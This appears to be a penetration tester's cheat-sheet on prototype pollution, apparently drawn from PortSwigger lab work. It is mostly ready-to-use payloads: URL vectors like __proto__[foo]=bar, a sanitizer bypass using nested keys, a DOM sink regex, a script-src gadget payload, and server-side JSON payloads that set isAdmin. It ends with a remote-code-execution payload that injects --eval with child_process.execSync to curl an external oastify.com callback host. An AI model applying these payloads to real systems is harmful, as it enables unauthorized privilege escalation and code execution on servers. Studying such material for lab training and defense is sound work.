[#](#) Prototype Pollution

> While browsing, `?constructor[prototype]...` content flashes in the URL bar? Yes, then try to exploit this...

## Prototype Pollution (DOM Invader)

Note: sometimes there's sanitizer blocking the detection (see manual)

1. Turn On Dom Invader
2. Attack -> Turn On Prototype Attacks
3. Browse normally the app and check the Dom tab
4. Scan for gadget -> Exploit -> If Not working, look at the sink value -> Any trailing caracter -> Add - or ; after the payload

## Manual

Find Prototype Source:

1. Prototype pollution vectors
2. 
    ```
    /?__proto__.foo=bar
    /?__proto__[foo]=bar
    /?constructor.prototype.foo=bar
    ```
3. Console: `Object.prototype`

    Injection

    `{foo: 'bar', __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}`

    No Injection:

    `{ __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}`

        Is there a santizer?

            ```
            // Vulnerability: not recurrent replace
            // Exploit: __pro__proto__to__ (i.e.: sandwich)
            
            function sanitizeKey(key) {
                let badProperties = ['constructor','__proto__','prototype'];
                for(let badProperty of badProperties) {
                    key = key.replaceAll(badProperty, '');
                }
                return key;
            }
            ```
            
Find a Sink:

```
(document\.|window\.)(write|writeln|createElement|domain)|location|eval|setTimeout|setInterval|innerHTML|outerHTML|insertAdjacentHTML|window\.open|onevent|Function
```


```
async function searchLogger() {

    // Object
    
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
    
        // Sink -> /?__proto__[transport_url]=data:,alert(1);
        
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

## Server Side


POST /ChaneAddress

```
{
    "City": "foo",
    "Address": 1234,
}
```

HTTP/2 200 OK

```
{
    "username": "wiener",
    "City": "foo",
    "Address": 1234,
    "isAdmin":true
}

```

Mass assignement not working? Try prototype pollution.

```
{
    "City": "foo",
    "Address": 1234,
    "__proto__": {
        "isAdmin":"true"
    }
}
```
    
Non-destructive method:

```
...
"__proto__": {
    "status":555
}
...
```

If not working, try to break the JSON format and keep the above.

Bypass flawed input filter with Constructor
NOTE: this can crash server, so it's better to start with more  easy stuff...

```
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```

```
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```

The lab is lagging...
https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

```
{
    "csrf":"OqwKew95Z7pzmd0On7q0LAqXPySnw7lt",
    "sessionId":"AKySV3lDI1AMJSlnXSTuBywAwhvdrlN0",
    "tasks":["db-cleanup",
    "fs-cleanup"],
    "__proto__": {
        "execArgv":[
            "--eval=require('child_process').execSync('curl https://d5jw5pbq9uqpxi5hosro1rlm2d85wykn.oastify.com')"
        ]
    }
}
```
